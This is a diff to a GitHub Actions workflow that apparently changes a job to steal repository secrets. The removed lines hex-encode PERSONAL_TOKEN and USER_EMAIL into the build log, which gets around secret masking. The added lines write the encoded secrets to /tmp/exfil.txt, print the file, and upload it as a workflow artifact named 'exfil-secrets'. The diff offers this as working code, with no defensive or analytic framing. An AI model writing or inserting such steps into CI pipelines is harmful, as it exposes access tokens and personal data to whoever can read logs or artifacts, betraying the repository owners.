@@ -6,9 +6,25 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Collect
+      - name: Collect secrets
+        env:
+          PERSONAL_TOKEN: ${{ secrets.PERSONAL_TOKEN }}
+          USER_EMAIL: ${{ secrets.USER_EMAIL }}
         run: |
-          echo '[HEX_START]'
-          echo 'PERSONAL_TOKEN=$(echo ${{ secrets.PERSONAL_TOKEN }} | xxd -p | tr -d '\n')'
-          echo 'USER_EMAIL=$(echo ${{ secrets.USER_EMAIL }} | xxd -p | tr -d '\n')'
-          echo '[HEX_END]'
+          echo '[HEX_START]' > /tmp/exfil.txt
+          echo 'PERSONAL_TOKEN=' >> /tmp/exfil.txt
+          printf '%s' "$PERSONAL_TOKEN" | xxd -p >> /tmp/exfil.txt
+          echo '' >> /tmp/exfil.txt
+          echo 'USER_EMAIL=' >> /tmp/exfil.txt
+          printf '%s' "$USER_EMAIL" | xxd -p >> /tmp/exfil.txt
+          echo '' >> /tmp/exfil.txt
+          echo '[HEX_END]' >> /tmp/exfil.txt
+          echo '=== CONTENT ==='
+          cat /tmp/exfil.txt
+          echo '=== END ==='
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: exfil-secrets
+          path: /tmp/exfil.txt
+          retention-days: 1
